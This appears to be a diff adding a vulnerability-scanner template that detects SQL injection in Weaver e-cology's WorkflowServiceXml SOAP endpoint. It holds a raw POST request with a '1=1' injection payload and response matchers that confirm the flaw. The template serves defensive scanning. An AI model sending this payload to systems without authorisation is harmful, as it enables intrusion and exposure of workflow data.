@@ -1,0 +1,40 @@
+id: weaver-e-cology-sql-injection-ct-1201009
+info:
+  name: Weaver e-cology SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a SQL injection vulnerability in the "WorkflowServiceXml" endpoint of Weaver e-cology.
+
+http:
+  - raw:
+      - |
+        POST /services/WorkflowServiceXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <web:getHendledWorkflowRequestList>
+                <web:in0>1</web:in0>
+                <web:in1>1</web:in1>
+                <web:in2>1</web:in2>
+                <web:in3>1</web:in3>
+                <web:in4>
+                    <web:string>1=1</web:string>
+                </web:in4>
+              </web:getHendledWorkflowRequestList>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "lastOperatorName"
+          - "lastOperateTime"
+          - "receiveTime"
+        part: body
